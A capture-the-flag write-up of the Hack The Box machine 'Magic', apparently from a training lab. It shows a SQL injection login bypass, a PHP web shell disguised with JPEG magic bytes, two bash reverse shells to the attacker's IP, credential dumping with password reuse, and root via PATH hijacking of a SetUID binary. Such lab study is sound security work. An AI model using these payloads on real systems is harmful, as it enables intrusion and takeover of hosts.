# Magic

This is the write-up for the box Magic that got retired at the 22nd August 2020.
My IP address was 10.10.14.10 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.185    magic.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/magic.nmap 10.10.10.185
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

On the website are several images and one link that forwards to a login page on _login.php_.
By testing a basic **SQL Injection** statement in the password parameter, the login works and forwards to _upload.php_:
```
POST /login.php HTTP/1.1
Host: 10.10.10.185
(...)
username=testuser&password='+OR+1%3d1--+-
```
```
# URL decoded SQL Injection statement
' OR 1=1-- -
```

The page _upload.php_ is a feature that allows to upload images.

Creating a PHP shell script _(shell.php)_ and trying to upload it:
```
<?php echo "This is a test string"; system($_REQUEST['cmd']); ?>
```

After uploading, it shows an error message that tells that only JPGs, JPEG and PNG files are allowed.
The first few bytes **(Magic Bytes)** of any JPEG file can be taken and morphed together with _shell.php_ to resemble a JPEG file:
```
head -c 20 5.jpeg > jpeg_magicbytes
```
```
cat jpg_magicbytes shell.php > magic_shell.php.jpeg
```

Now it gets recognized as an image and successfully uploaded and can be found in the _images/uploads_ directory:
```
http://10.10.10.185/images/uploads/magic_shell.php.jpeg?cmd=whoami
```

The parameter takes commands and `whoami` got executed, which proofs command execution.
Lets use this to gain a reverse shell:
```
POST /images/uploads/magic_shell.php.jpeg HTTP/1.1
Host: 10.10.10.185
(...)
cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.10/9001 0>&1'
```

After URL-encoding the command and sending the request, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

## Privilege Escalation

In the directory _/var/www/Magic_ is a file called _db.php5_ which contains credentials for a database:
```
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

The MySQL binary is not installed, but the **mysqldump** command can be used to dump the contents of the database:
```
mysqldump -u theseus -p Magic
```

There is one table called _login_ and in there are credentials for the website login:
```
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```

The password is reused for the user _theseus_ on the box and it is possible to switch users:
```
su - theseus
```

### Privilege Escalation to root

After searching for non-default binaries with the **SetUID bit** set, the output does not look too suspicious:
```
find / -type f -perm -4000 2>/dev/null | grep -v snap
```

But when checking the `groups` of the user, there is a group called _users_ and this group owns the binary _/bin/sysinfo_ that has the **SetUID bit** set:
```
find / -group users -ls 2>/dev/null

-rwsr-x---   1 root     users       22040 Oct 21  2019 /bin/sysinfo
```

The binary outputs hardware, CPU, memory and disk information, so it probably executes other Linux commands.
Lets follow the **Syscalls** of the binary and look through the forks, if another command is executed with relative paths:
```
strace /bin/sysinfo 2>strace_sysinfo.txt

grep execve strace_sysinfo.txt
```
```
[pid 18965] execve("/usr/bin/lshw", ["lshw", "-short"],
[pid 18967] execve("/sbin/fdisk", ["fdisk", "-l"],
[pid 18969] execve("/bin/cat", ["cat", "/proc/cpuinfo"],
[pid 18971] execve("/usr/bin/free", ["free", "-h"],
```

All these binaries are not called with the absolute path, so we can choose one of them and create a binary with the same name to inject our own code into it.

Creating a reverse shell script in _/dev/shm_ and call it _free_:
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.10/9002 0>&1'
```

> NOTE: It also works to call the script `cat`, `fdisk` or `lshw`.

Making it executable:
```
chmod +x free
```

Changing the **PATH environment** to add _/dev/shm_ at the beginning:
```
export PATH=/dev/shm:$PATH
```

Executing _/bin/sysinfo_:
```
/bin/sysinfo
```

After executing the binary, the `free` command will run from _/dev/shm_ and execute the reverse shell script.
The listener on my IP and port 9002 starts a connection as root!
